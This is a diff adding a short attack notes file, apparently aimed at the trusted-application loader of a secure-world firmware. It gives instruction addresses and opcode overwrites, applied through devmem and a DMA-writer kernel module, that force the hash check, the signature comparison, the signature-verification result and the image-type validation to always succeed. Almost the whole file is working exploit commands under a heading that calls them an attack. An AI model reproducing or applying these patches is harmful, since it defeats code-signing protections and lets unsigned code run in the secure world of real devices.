@@ -1,0 +1,46 @@
+0x1010466c fc03002a mov w28, w0
+0x10104684
+
+0x10104920 1f0001eb cmp x0,x1
+
+
+command:
+0000004a eor w0,w0,w0
+
+override data:
+devmem  0x10104684 W 0x4a000000
+devmem  0x1010466c W 0x4a000000
+devmem  0x10104920 W 0xeb00001f
+
+
+# // crypto_hash_final check
+0x4a000000 - eor w0,w0,w0
+0x6b00001f - cmp w0,w0
+devmem 0x101043ec W 0x4a000000
+devmem 0x10104408 W 0x6b00001f
+devmem 0x10104890 W 0x6b00001f
+devmem 0x10104c3c W 0x4a000000
+
+
+
+# Attack
+# Address of ree_fs_ta_read, 000d0035 - cbnz w0, 0x1010458c.
+# This command check if the function crypto_hash_final succeeded and we change it to always true
+insmod dma_writer.ko addr=0x101043ec data=0x4a000000 offset=0
+rmmod dma_writer.ko
+
+# Address of ree_fs_ta_read, 1f000071 - cmp w0, 0.
+# This command check if the memcmp of the signature is correct. We override this comparasion
+insmod dma_writer.ko addr=0x10104408 data=0x6b00001f offset=0
+rmmod dma_writer.ko
+
+# Address of ree_fs_ta_open, f303002a - mov w19, w0.
+# This command compare the result of shdr_verify_signature
+insmod dma_writer.ko addr=0x10104c3c data=0x4a000000 offset=0
+rmmod dma_writer.ko
+
+# Address of ree_fs_ta_open, 1f00016b - cmp w0,w1.
+# This command is part of the image type validation
+insmod dma_writer.ko addr=0x10104890 data=0x6b00001f offset=0
+rmmod dma_writer.ko
+
